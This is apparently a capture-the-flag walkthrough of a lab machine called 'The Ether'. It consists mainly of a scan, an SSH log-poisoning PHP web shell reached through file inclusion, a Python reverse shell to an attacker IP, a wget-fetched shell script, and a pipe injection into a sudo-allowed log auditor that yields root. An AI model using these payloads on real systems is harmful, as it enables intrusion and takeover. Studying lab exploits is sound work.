EvilScene

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
To exploit ssh ‘<?php system($_GET[‘C’]);?>’@192.168.1.146
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.105
Host is up (0.00055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
|   256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
|_  256 86:6c:7c:4b:04:7e:57:4f:68:16:a9:74:4c:0d:2f:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: The Ether
MAC Address: 08:00:27:AE:7A:3D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Testing for Local File Inclusion 
We found that we can access /var/log/auth.log

![Alt Tag]()


To exploit we leverage the auth log

ssh "<?php echo system($_GET[’cmd']);?>"@192.168.56.105

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh "<?php echo system($_GET['cmd']);?>"@192.168.56.105
<?php echo system(['cmd']);?>@192.168.56.105's password: 
Permission denied, please try again.
<?php echo system(['cmd']);?>@192.168.56.105's password: 
Permission denied, please try again.
<?php echo system(['cmd']);?>@192.168.56.105's password: 
<?php echo system(['cmd']);?>@192.168.56.105: Permission denied (publickey,password).

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Reverse shell - Remote Command Execution
![Alt Tag]()


Getting a reverse shell using python:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is URL encoded and send to the server:

![Alt Tag]()

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 50232
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash");'
bash-4.3$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.3$ pwd
pwd
/var/www/html/theEther.com/public_html
bash-4.3$ sudo -l
sudo -l
sudo: unable to resolve host theEther: Connection refused
Matching Defaults entries for www-data on theEther:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on theEther:
    (ALL) NOPASSWD: /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
    (root) NOPASSWD: /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@theEther:/var/www/html/theEther.com/public_html$ wget http://192.168.56.102:8787/log.py -O /tmp/log.py
<tml$ wget http://192.168.56.102:8787/log.py -O /tmp/log.py                  
--2019-10-20 01:29:11--  http://192.168.56.102:8787/log.py
Connecting to 192.168.56.102:8787... connected.
HTTP request sent, awaiting response... 200 OK
Length: 243 [text/plain]
Saving to: '/tmp/log.py'

/tmp/log.py         100%[===================>]     243  --.-KB/s    in 0s      

2019-10-20 01:29:11 (59.2 MB/s) - '/tmp/log.py' saved [243/243]

$ cat /tmp/log.py
#!/usr/bin/python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.56.102",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
ssp=subprocess.call(["/bin/sh","-i"]);




www-data@theEther:/var/www/html/theEther.com/public_html$ chmod +x /tmp/log.py
<html/theEther.com/public_html$ chmod +x /tmp/log.py                         
www-data@theEther:/var/www/html/theEther.com/public_html$ sudo ./xxxlogauditorxxx.py
<html/theEther.com/public_html$ sudo ./xxxlogauditorxxx.py                   
sudo: unable to resolve host theEther: Connection refused
===============================
Log Auditor
===============================
Logs available
-------------------------------
/var/log/auth.log
/var/log/apache2/access.log
-------------------------------

Load which log?: /var/log/auth.log | /tmp/log.py
/var/log/auth.log | /tmp/log.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Root Shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 50976
# id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



